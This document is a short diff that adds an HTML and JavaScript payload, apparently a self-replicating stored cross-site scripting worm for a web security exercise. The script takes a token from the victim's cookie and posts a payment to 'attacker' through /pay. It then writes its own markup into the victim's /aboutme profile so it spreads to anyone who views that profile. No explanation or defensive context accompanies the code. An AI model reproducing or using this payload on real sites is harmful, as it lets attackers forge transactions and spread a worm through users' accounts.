@@ -1,0 +1,13 @@
+<div id="xssAboutMe">
+<script>
+var cookieVal=document.cookie.substring(8);
+var xhr = new XMLHttpRequest();
+xhr.open("POST","/pay");
+xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xhr.send("CSRF_token="+cookieVal+"&recipient=attacker&amount=1");
+var xhrr = new XMLHttpRequest();
+xhrr.open("POST","/aboutme");
+xhrr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xhrr.send("aboutme="+encodeURIComponent(document.getElementById("xssAboutMe").outerHTML));
+</script> 
+</div>
